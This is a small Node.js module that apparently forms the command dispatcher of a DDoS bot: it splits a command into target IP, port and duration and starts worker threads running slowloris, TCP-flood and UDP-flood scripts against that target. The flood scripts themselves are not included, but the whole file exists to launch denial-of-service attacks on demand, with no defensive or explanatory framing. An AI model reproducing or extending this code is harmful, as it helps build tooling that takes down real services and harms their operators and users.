const { builtinModules } = require("module");
const { Worker } = require("worker_threads");

function startWorker(ddosWorker, command) {
  const args = command.split(" ");
  const ip = args[1];
  const port = args[2];
  const duration = args[3];
  const worker = new Worker(ddosWorker, { workerData: { ip, port, duration } });

  worker.on("error", (error) => {
    console.log(error);
  });

  worker.on("exit", (exitCode) => {
    console.log(exitCode);
  });
}
const ddos = {
  slowloris: (command) => {
    startWorker("./commands/ddos/slowloris.js", command);
  },
  tcpFlood: (command) => {
    startWorker("./commands/ddos/tcpFlood.js", command);
  },
  udpFlood: (command) => {
    startWorker("./commands/ddos/udpFlood.js", command);
  },
};
module.exports=ddos;
